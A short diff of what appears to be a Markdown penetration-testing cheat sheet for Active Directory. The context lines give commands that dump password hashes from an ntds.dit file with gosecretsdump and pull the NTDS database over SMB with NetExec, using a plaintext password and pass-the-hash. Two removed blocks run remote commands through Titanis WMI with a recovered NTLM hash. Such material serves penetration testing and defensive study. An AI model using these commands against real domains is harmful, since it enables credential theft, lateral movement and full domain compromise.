@@ -1455,10 +1455,6 @@ gosecretsdump -ntds ntds.dit -system SYSTEM
 gosecretsdump -ntds ntds.dit -system SYSTEM -enabled   # enabled accounts only
 gosecretsdump -ntds ntds.dit -system SYSTEM -history   # include password history
 gosecretsdump -ntds ntds.dit -system SYSTEM -out hashes.txt
-
-# Titanis — PTH with recovered hash (use IP; FQDNs fail at WMI DCOM activation)
-Wmi exec 192.168.1.1 -UserName Administrator@DOMAIN \
-  -NtlmHash <recovered_ntlm> "whoami"
 ```
 
 [↑ Back to Index](#index)
@@ -1506,10 +1502,6 @@ netexec smb 192.168.1.1 -u Administrator -p Password123 --ntds --user krbtgt
 
 # NetExec — pass-the-hash
 netexec smb 192.168.1.1 -u Administrator -H A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 --ntds
-
-# Titanis — PTH with recovered hash (use IP; FQDNs fail at WMI DCOM activation)
-Wmi exec 192.168.1.1 -UserName Administrator@DOMAIN \
-  -NtlmHash <recovered_ntlm> "whoami"
 ```
 
 [↑ Back to Index](#index)
